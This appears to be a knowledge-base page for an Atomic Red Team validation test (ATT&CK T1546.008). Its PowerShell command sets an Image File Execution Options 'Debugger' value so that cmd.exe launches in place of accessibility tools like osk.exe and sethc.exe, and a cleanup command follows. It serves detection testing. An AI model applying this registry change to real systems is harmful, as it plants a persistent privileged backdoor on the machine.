---
atomic_guid: "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9"
title: "Attaches Command Prompt as a Debugger to a List of Target Processes"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9"
  - "Attaches Command Prompt as a Debugger to a List of Target Processes"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.
Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546008-accessibility-features|T1546.008: Accessibility Features]]

## Input Arguments

### attached_process

- description: Full path to process to attach to target in #{parent_list}. Default: cmd.exe

- type: path
- default: C:\windows\system32\cmd.exe

### parent_list

- description: Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: "osk.exe"

- type: string
- default: osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}
```

### Cleanup

```powershell
$input_table = "#{parent_list}".split(",")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
